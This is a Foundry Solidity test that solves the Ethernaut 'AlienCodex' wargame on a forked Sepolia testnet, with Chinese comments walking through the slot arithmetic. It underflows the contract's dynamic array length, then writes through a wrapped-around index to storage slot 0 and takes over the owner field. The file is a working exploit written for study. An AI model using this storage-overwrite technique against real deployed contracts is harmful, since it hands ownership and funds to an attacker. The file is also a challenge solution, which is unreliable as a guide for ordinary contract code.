// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {HelpUtils} from "./HelpUtils.sol";
import {Test, console} from "forge-std/Test.sol";
import {IAlienCodex} from "../src/ethernaut/AlienCodex.sol";

contract AlienCodexAttacker is Test {
    address constant alienCodex = 0x8Ee19B2836AE1833f47B90328e9F00dA848f0071;
    uint256 constant blockNumber = 6333131;
    address constant alice = 0x6278A1E803A76796a3A1f7F6344fE874ebfe94B2;

    function setUp() external {
        vm.selectFork(
            vm.createFork(vm.envString("SEPOLIA_RPC_URL"), blockNumber)
        );
    }

    function testAttack() public {
        console.log("Attack Before:");
        console.log("alienCodex owner:", IAlienCodex(alienCodex).owner());
        console.log(
            "codex array length:",
            uint256(vm.load(alienCodex, bytes32(uint256(1))))
        );

        _attack();
        console.log("Attack After:");
        console.log(
            "codex array length:",
            uint256(vm.load(alienCodex, bytes32(uint256(1))))
        );
        console.log("alienCodex owner:", IAlienCodex(alienCodex).owner());

        assertEq(IAlienCodex(alienCodex).owner(), alice);
    }

    function _attack() internal {
        vm.startPrank(alice, alice);
        IAlienCodex(alienCodex).makeContact();
        IAlienCodex(alienCodex).retract();

        // codex[0] 的 slot => p
        uint256 p = uint256(keccak256(abi.encode(1)));
        uint256 codex_1 = p + 1;
        uint256 codex_2 = p + 2;
        // codex[3] 的 slot => p + 3
        uint256 codex_3 = p + 3;
        uint256 codex_x = type(uint256).max;
        // slot_max 存储的是codex的哪个元素
        uint256 x = type(uint256).max - p;
        // codex[x+1] 的 slot => type(uint256).max + 1 =>上益 => 0
        // 修改codex[x+1]的值 就是修改slot存储的值

        bytes32 _content = bytes32(uint256(uint160(alice)));

        IAlienCodex(alienCodex).revise(x + 1, _content);

        vm.stopPrank();
    }
}

// forge test --match-contract AlienCodexAttacker -vvv
